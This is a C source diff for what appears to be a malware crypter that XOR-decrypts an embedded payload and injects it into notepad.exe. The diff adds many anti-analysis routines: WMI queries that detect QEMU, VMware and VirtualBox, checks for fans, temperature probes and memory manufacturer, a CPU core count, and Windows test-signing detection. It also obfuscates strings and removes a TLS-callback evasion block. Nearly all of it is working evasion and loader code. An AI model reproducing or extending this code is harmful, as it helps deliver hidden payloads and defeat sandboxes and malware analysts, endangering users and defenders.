@@ -13,6 +13,7 @@
 #define WIN32_LEAN_AND_MEAN
 #define MAX_KEY_LENGTH 255
 #define MAX_VALUE_NAME 16383
+
 // function prototypes
 //replaceatbeginning0
 //replaceatbeginning1
@@ -25,8 +26,8 @@
 //replaceatbeginning8
 //replaceatbeginning9
 byte *GetPayload(void);
-byte *decrypted(byte *data, int length, int crytptkey);
-WCHAR *widedecrypt(byte *data, int length, int crytptkey);
+//byte *decrypted(byte *data, int length, int crytptkey);
+//WCHAR *widedecrypt(byte *data, int length, int crytptkey);
 void LongStall(void);
 int procmem_evas(void);
 int NumaEvas(void);
@@ -46,7 +47,13 @@ BOOL IsInsideVMWare(void);
 char GetNtGlobalFlags(void);
 void checkQIP(void);
 void GetHeapFlags(void);
-void anti_vm_wmi(void);
+void anti_vm_wmi_1(void);
+void anti_vm_wmi_2(void);
+void anti_vm_wmi_3(void);
+void anti_vm_wmi_4(void);
+void anti_vm_wmi_5(void);
+void anti_vm_wmi_6(void);
+void anti_vm_wmi_7(void);
 int reg_enum_vm_check(void);
 int AntiEmu(void);
 void JoeSpecial(void);
@@ -56,33 +63,10 @@ void GS_Check(void);
 void AntiProcMon(void);
 void date_specific_check(char *shortdate);
 void region_specific_check(char *region);
-// tls declaration
-void NTAPI xmuphatgbkmj(PVOID DllHandle,DWORD dwReason,PVOID Reserved) // will be run 4 times. 
-{
-//checks here
-                                                                                                                                                                                      date_specific_check("10/3/2019");
-                                                                                                                                                                                                                                                                                                                                                                                                                    
-			
-}
-//linker spec
-#ifdef _M_IX86
-#pragma comment (linker, "/INCLUDE:__tls_used")
-#pragma comment (linker, "/INCLUDE:__xl_b")
-#else
-#pragma comment (linker, "/INCLUDE:_tls_used")
-#pragma comment (linker, "/INCLUDE:_xl_b")
-#endif
-#ifdef _M_X64
-#pragma const_seg (".CRT$XLB")
-const
-#else
-#pragma data_seg (".CRT$XLB")
-#endif
-//end linker
-//tls import
-EXTERN_C PIMAGE_TLS_CALLBACK _xl_b = xmuphatgbkmj;
-#pragma const_seg ()
+void CheckCoreCount(void);
+void testsigning(void);
 //const char g_szClassName[] = "JoeCrypter";
+
 DWORD rsrc_len = 0;
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
@@ -91,11 +75,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
     {
 		case WM_CREATE:
 		{	
-         // same as usual, checks are in the TLS callback function set by the main prog  
-		 // having evasions in the TLS callback breaks things. Certain functions rely on the WndProc
-			LotsOfWindows(hwnd);
-			
-			byte *payload = decrypted(GetPayload(),rsrc_len, 45099);
+                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+			byte *payload = decrypted(GetPayload(),rsrc_len, 123);
 			ExecFile(decrypted("f?YYrlkajrvYYv|vq`h67YYkjq`uda+`}`",34,5),payload); // xor'd by 5 from c:\\windows\\system32\\notepad.exe
 		}
 		break;
@@ -429,7 +410,7 @@ int FlsTrick(void)
 }
 
 void PassToNoobs(void)
-{	
+{
 // maybe randomize this? cram garbage instructions here. 
 	__asm
 	{
@@ -547,21 +528,19 @@ void checkQIP(void)
 		}
 	}
 }
-void anti_vm_wmi(void)
+
+void anti_vm_wmi_1(void)
 {
     // result code from COM calls
     HRESULT hr = 0;
-
     // COM interface pointers
     IWbemLocator         *locator  = NULL;
     IWbemServices        *services = NULL;
     IEnumWbemClassObject *results  = NULL;
-
-    BSTR resource = SysAllocString(L"ROOT\\CIMV2");
-    BSTR language = SysAllocString(L"WQL");
-        //BSTR query    = SysAllocString(L"SELECT * FROM Win32_DiskDrive");
+    BSTR resource = SysAllocString(widedecrypt("YDD_WWHBF]9",11,11)); //  ROOT\\CIMV2,11,11
+    BSTR language = SysAllocString(widedecrypt("Y_B",3,14)); // WQL,3,14
+    //BSTR query    = SysAllocString(L"SELECT * FROM Win32_DiskDrive");
 	BSTR query    = SysAllocString(widedecrypt("WAHAGP$.$BVKI$Smj76[@mwo@vmra",29,4));
-	// SELECT Caption FROM Win32_DiskDrive
 
     hr = CoInitializeEx(0, COINIT_MULTITHREADED);
     hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
@@ -575,6 +554,65 @@ void anti_vm_wmi(void)
             VARIANT caption;
             hr = result->lpVtbl->Get(result, widedecrypt("Fduqljk",7,5), 0, &caption, 0, 0); // Caption
 			char prop[128];
+			wcstombs(prop,caption.bstrVal,SysStringByteLen(caption.bstrVal));
+			char *vm1 = decrypted("UAIQ",4,4); // QEMU
+			char *vm2 = decrypted("_D~h{l",6,9); // VMware
+			char *vm3 = decrypted("pdi~",4,6); // vbox
+
+			if(strstr(prop,vm1))
+			{
+				PassToNoobs();
+			}
+
+			if(strstr(prop,vm2))
+			{
+				PassToNoobs();
+			}
+
+			if(strstr(prop,vm3))
+			{
+				PassToNoobs();
+			}
+            result->lpVtbl->Release(result);
+        }
+    }
+    // release WMI COM interfaces
+    results->lpVtbl->Release(results);
+    services->lpVtbl->Release(services);
+    locator->lpVtbl->Release(locator);
+
+    // unwind everything else we've allocated
+    CoUninitialize();
+
+    SysFreeString(query);
+    SysFreeString(language);
+    SysFreeString(resource);
+	return; // yay no vm
+}
+
+void anti_vm_wmi_2(void)
+{
+	HRESULT hr = 0;
+    IWbemLocator         *locator  = NULL;
+    IWbemServices        *services = NULL;
+    IEnumWbemClassObject *results  = NULL;
+    BSTR resource = SysAllocString(widedecrypt("YDD_WWHBF]9",11,11)); //  ROOT\\CIMV2,11,11
+    BSTR language = SysAllocString(widedecrypt("Y_B",3,14)); // WQL,3,14
+    BSTR query    = SysAllocString(widedecrypt("TBKBDS'-'AUHJ'Pni45XENHT",24,7)); //SELECT * FROM Win32_BIOS
+    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
+    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
+    hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID *) &locator);
+    hr = locator->lpVtbl->ConnectServer(locator, resource, NULL, NULL, NULL, 0, NULL, NULL, &services);
+    hr = services->lpVtbl->ExecQuery(services, language, query, WBEM_FLAG_BIDIRECTIONAL, NULL, &results);
+    if (results != NULL) 
+	{
+        IWbemClassObject *result = NULL;
+        ULONG returnedCount = 0;
+        while((hr = results->lpVtbl->Next(results, WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) 
+		{
+            VARIANT caption;
+            hr = result->lpVtbl->Get(result, widedecrypt("Zl{`heG|dkl{",12,9), 0, &caption, 0, 0); // SerialNumber,12,9
+			char prop[256];
 			wcstombs(prop,caption.bstrVal,SysStringByteLen(caption.bstrVal));
 			
 			char *vm1 = decrypted("UAIQ",4,4); // QEMU
@@ -595,20 +633,239 @@ void anti_vm_wmi(void)
 			{
 				PassToNoobs();
 			}
-			
             result->lpVtbl->Release(result);
-			return; // yay no vm
         }
     }
-
-    // release WMI COM interfaces
     results->lpVtbl->Release(results);
     services->lpVtbl->Release(services);
     locator->lpVtbl->Release(locator);
-
-    // unwind everything else we've allocated
     CoUninitialize();
+    SysFreeString(query);
+    SysFreeString(language);
+    SysFreeString(resource);
+}
 
+void anti_vm_wmi_3(void)
+{
+	HRESULT hr = 0;
+    IWbemLocator         *locator  = NULL;
+    IWbemServices        *services = NULL;
+    IEnumWbemClassObject *results  = NULL;
+    BSTR resource = SysAllocString(widedecrypt("YDD_WWHBF]9",11,11)); //  ROOT\\CIMV2,11,11
+    BSTR language = SysAllocString(widedecrypt("Y_B",3,14)); // WQL,3,14
+    BSTR query    = SysAllocString(widedecrypt("WAHAGP$.$BVKI$Smj76[GkitqpavW}wpai",34,4)); // SELECT * FROM Win32_ComputerSystem
+	
+    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
+    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
+    hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID *) &locator);
+    hr = locator->lpVtbl->ConnectServer(locator, resource, NULL, NULL, NULL, 0, NULL, NULL, &services);
+    hr = services->lpVtbl->ExecQuery(services, language, query, WBEM_FLAG_BIDIRECTIONAL, NULL, &results);
+    if (results != NULL) 
+	{
+        IWbemClassObject *result = NULL;
+        ULONG returnedCount = 0;
+        while((hr = results->lpVtbl->Next(results, WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) 
+		{
+            VARIANT caption;
+            hr = result->lpVtbl->Get(result, widedecrypt("Hja`i",5,5), 0, &caption, 0, 0); // model,5,5
+			char prop[128];
+			wcstombs(prop,caption.bstrVal,SysStringByteLen(caption.bstrVal));
+			
+			char *vm1 = decrypted("YME]",4,8); //QEMU
+			char *vm2 = decrypted("QJpfub",6,7); // VMware
+			char *vm3 = decrypted("ual{",4,3); // vbox
+			
+			if(strstr(prop,vm1))
+			{
+				PassToNoobs();
+			}
+
+			if(strstr(prop,vm2))
+			{
+				PassToNoobs();
+			}
+
+			if(strstr(prop,vm3))
+			{
+				PassToNoobs();
+			}
+            result->lpVtbl->Release(result);
+        }
+    }
+
+    results->lpVtbl->Release(results);
+    services->lpVtbl->Release(services);
+    locator->lpVtbl->Release(locator);
+    CoUninitialize();
+    SysFreeString(query);
+    SysFreeString(language);
+    SysFreeString(resource);	
+}
+
+void anti_vm_wmi_4(void)
+{
+	HRESULT hr = 0;
+    IWbemLocator         *locator  = NULL;
+    IWbemServices        *services = NULL;
+    IEnumWbemClassObject *results  = NULL;
+    BSTR resource = SysAllocString(widedecrypt("YDD_WWHBF]9",11,11)); //  ROOT\\CIMV2,11,11
+    BSTR language = SysAllocString(widedecrypt("Y_B",3,14)); // WQL,3,14
+    BSTR query    = SysAllocString(widedecrypt("WAHAGP$.$BVKI$Smj76[GkitqpavW}wpai",34,4)); // SELECT * FROM Win32_ComputerSystem
+	
+    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
+    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
+    hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID *) &locator);
+    hr = locator->lpVtbl->ConnectServer(locator, resource, NULL, NULL, NULL, 0, NULL, NULL, &services);
+    hr = services->lpVtbl->ExecQuery(services, language, query, WBEM_FLAG_BIDIRECTIONAL, NULL, &results);
+    if (results != NULL) 
+	{
+        IWbemClassObject *result = NULL;
+        ULONG returnedCount = 0;
+        while((hr = results->lpVtbl->Next(results, WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) 
+		{
+            VARIANT caption;
+            hr = result->lpVtbl->Get(result, widedecrypt("Dhg|ohj}|{l{",12,9), 0, &caption, 0, 0); // Manufacturer,12,9
+			char prop[128];
+			wcstombs(prop,caption.bstrVal,SysStringByteLen(caption.bstrVal));
+			
+			char *vm1 = decrypted("YME]",4,8); //QEMU
+			char *vm2 = decrypted("QJpfub",6,7); // VMware
+			char *vm3 = decrypted("ual{",4,3); // vbox
+			
+			if(strstr(prop,vm1))
+			{
+				PassToNoobs();
+			}
+
+			if(strstr(prop,vm2))
+			{
+				PassToNoobs();
+			}
+
+			if(strstr(prop,vm3))
+			{
+				PassToNoobs();
+			}
+            result->lpVtbl->Release(result);
+        }
+    }
+    results->lpVtbl->Release(results);
+    services->lpVtbl->Release(services);
+    locator->lpVtbl->Release(locator);
+    CoUninitialize();
+    SysFreeString(query);
+    SysFreeString(language);
+    SysFreeString(resource);	
+}
+
+void anti_vm_wmi_5(void)
+{
+	HRESULT hr = 0;
+    IWbemLocator         *locator  = NULL;
+    IWbemServices        *services = NULL;
+    IEnumWbemClassObject *results  = NULL;
+    BSTR resource = SysAllocString(widedecrypt("YDD_WWHBF]9",11,11)); //  ROOT\\CIMV2,11,11
+    BSTR language = SysAllocString(widedecrypt("Y_B",3,14)); // WQL,3,14
+    BSTR query    = SysAllocString(widedecrypt("YOFOI^* *LXEG*]cd98ULkd",23,10)); // SELECT * FROM Win32_Fan,23,10
+	
+    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
+    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
+    hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID *) &locator);
+    hr = locator->lpVtbl->ConnectServer(locator, resource, NULL, NULL, NULL, 0, NULL, NULL, &services);
+    hr = services->lpVtbl->ExecQuery(services, language, query, WBEM_FLAG_BIDIRECTIONAL, NULL, &results);
+    	if (results != NULL) 
+		{
+        IWbemClassObject *result = NULL;
+        ULONG returnedCount = 0;
+        	while((hr = results->lpVtbl->Next(results, WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) 
+			{
+           	// fan present means we're on physical otherwise returns error below
+       		}
+    	}
+		if(GetLastError() == 14007)
+		{
+		PassToNoobs();
+		}
+    results->lpVtbl->Release(results);
+    services->lpVtbl->Release(services);
+    locator->lpVtbl->Release(locator);
+    CoUninitialize();
+    SysFreeString(query);
+    SysFreeString(language);
+    SysFreeString(resource);
+}
+void anti_vm_wmi_6(void)
+{
+	HRESULT hr = 0;
+    IWbemLocator         *locator  = NULL;
+    IWbemServices        *services = NULL;
+    IEnumWbemClassObject *results  = NULL;
+    BSTR resource = SysAllocString(widedecrypt("YDD_WWHBF]9",11,11)); //  ROOT\\CIMV2,11,11
+    BSTR language = SysAllocString(widedecrypt("Y_B",3,14)); // WQL,3,14
+    BSTR query    = SysAllocString(widedecrypt("TBKBDS'-'AUHJ'Pni45XSbjwbufsrubWuheb",36,7)); // SELECT * FROM Win32_TemperatureProbe,36,7
+
+    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
+    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
+    hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID *) &locator);
+    hr = locator->lpVtbl->ConnectServer(locator, resource, NULL, NULL, NULL, 0, NULL, NULL, &services);
+    hr = services->lpVtbl->ExecQuery(services, language, query, WBEM_FLAG_BIDIRECTIONAL, NULL, &results);
+    if (results != NULL) 
+	{
+        IWbemClassObject *result = NULL;
+        ULONG returnedCount = 0;
+        while((hr = results->lpVtbl->Next(results, WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) 
+		{
+			// if something returns we're on physical
+		}
+		if(GetLastError() == 14007)
+		{
+		PassToNoobs();
+		}
+    }
+    results->lpVtbl->Release(results);
+    services->lpVtbl->Release(services);
+    locator->lpVtbl->Release(locator);
+    CoUninitialize();
+    SysFreeString(query);
+    SysFreeString(language);
+    SysFreeString(resource);
+}
+void anti_vm_wmi_7(void)
+{
+	HRESULT hr = 0;
+    IWbemLocator         *locator  = NULL;
+    IWbemServices        *services = NULL;
+    IEnumWbemClassObject *results  = NULL;
+    BSTR resource = SysAllocString(widedecrypt("YDD_WWHBF]9",11,11)); //  ROOT\\CIMV2,11,11
+    BSTR language = SysAllocString(widedecrypt("Y_B",3,14)); // WQL,3,14
+    BSTR query    = SysAllocString(widedecrypt("V@I@FQ%/%CWJH%Rlk67ZUm|vlfdiH`hjw|",34,5)); // SELECT * FROM Win32_PhysicalMemory,34,5
+	
+    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
+    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
+    hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID *) &locator);
+    hr = locator->lpVtbl->ConnectServer(locator, resource, NULL, NULL, NULL, 0, NULL, NULL, &services);
+    hr = services->lpVtbl->ExecQuery(services, language, query, WBEM_FLAG_BIDIRECTIONAL, NULL, &results);
+	
+    if (results != NULL) 
+	{
+        IWbemClassObject *result = NULL;
+        ULONG returnedCount = 0;
+        while((hr = results->lpVtbl->Next(results, WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) 
+		{
+            VARIANT caption;
+            hr = result->lpVtbl->Get(result, widedecrypt("Nbmveb`wvqfq",12,3), 0, &caption, 0, 0); // Manufacturer,12,3
+			if(SysStringByteLen(caption.bstrVal) == 0)
+			{
+			//no data? must be a vm!
+			PassToNoobs();
+			}
+			result->lpVtbl->Release(result);
+        }
+    }
+    results->lpVtbl->Release(results);
+    services->lpVtbl->Release(services);
+    locator->lpVtbl->Release(locator);
+    CoUninitialize();
     SysFreeString(query);
     SysFreeString(language);
     SysFreeString(resource);
@@ -1071,26 +1328,6 @@ char *lang = "";
 	return;
 }
 
-byte *decrypted(byte *data, int length, int crytptkey)
-{	
-	byte *out = (byte*)malloc(length+1);
-	for(int x=0;x < length;x++)
-	{
-	out[x] = data[x] ^ crytptkey; 
-	}
-	return out;
-}
-
-WCHAR *widedecrypt(byte *data, int length, int crytptkey)
-{	
-	WCHAR *out = (WCHAR*)malloc(length+1);
-	for(int x=0;x < length;x++)
-	{
-	out[x] = data[x] ^ crytptkey; 
-	}
-	return out;
-}
-
 int timing_evasion_1(void)
 {	
 	DWORD joe_time_test1, joe_time_test2;
@@ -1208,6 +1445,80 @@ int timing_evasion_6(void)
 	mov x,ebx
 		}
 	return x;
+}
+void CheckCoreCount(void)
+{
+	HANDLE proc;
+	DWORD corecount;
+	signed int bitpos;
+	DWORD result;
+	SYSTEM_INFO sysinf;
+	ULONG_PTR ProcessAffinityMask;
+	ULONG_PTR SystemAffinityMask;
+	proc = GetCurrentProcess();
+	if(GetProcessAffinityMask(proc,&ProcessAffinityMask,&SystemAffinityMask))
+	{
+		
+		corecount = 0;
+		bitpos = 0;
+		do
+		{
+			if((1 << bitpos) & SystemAffinityMask)
+				corecount++;
+			bitpos++;
+			
+		}
+		while(bitpos < 32);
+		result = corecount;
+
+	}
+	else{
+		GetSystemInfo(&sysinf);
+		result = sysinf.dwNumberOfProcessors;
+		
+	}
+	if(result < 2)
+	{
+		PassToNoobs();
+	}
+	else{
+		return;
+	}
+}
+typedef struct _SYSTEM_CODEINTEGRITY_INFORMATION
+{
+    unsigned long Length;
+    unsigned long CodeIntegrityOptions;
+} SYSTEM_CODEINTEGRITY_INFORMATION, *PSYSTEM_CODEINTEGRITY_INFORMATION;
+typedef enum _SYSTEM_INFORMATION_CLASS {
+    SystemBasicInformation = 0,
+    SystemPerformanceInformation = 2,
+    SystemTimeOfDayInformation = 3,
+    SystemProcessInformation = 5,
+    SystemProcessorPerformanceInformation = 8,
+    SystemInterruptInformation = 23,
+    SystemExceptionInformation = 33,
+    SystemRegistryQuotaInformation = 37,
+    SystemLookasideInformation = 45
+} SYSTEM_INFORMATION_CLASS;
+
+typedef NTSTATUS ( WINAPI *NQS )( SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG );
+void testsigning(void)
+{	
+	char *libname = "lvfnn,fnn";// ntdll.dll,9,2
+	char *funcname = "JpUqav}W}wpaiMjbkviepmkj"; // NtQuerySystemInformation,24,4
+	NQS NtQuerySystemInformation  = ( NQS )GetProcAddress( GetModuleHandle( decrypted(libname,9,2)), decrypted(funcname,24,4));
+	SYSTEM_CODEINTEGRITY_INFORMATION sci = {0};
+	unsigned long dwcbSz = 0;
+	sci.Length = sizeof(sci);
+	if(NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x67,&sci,sizeof(sci),&dwcbSz) >= 0 && dwcbSz == sizeof(sci))
+	{
+    	BOOL bTestsigningEnabled = !!(sci.CodeIntegrityOptions & 0x2); // CODEINTEGRITY_OPTION_TESTSIGN
+		if(bTestsigningEnabled)
+		{
+			PassToNoobs();
+		}
+	}
 }
 
 /* possibly use this for verifying sleep took place. Maybe add later.
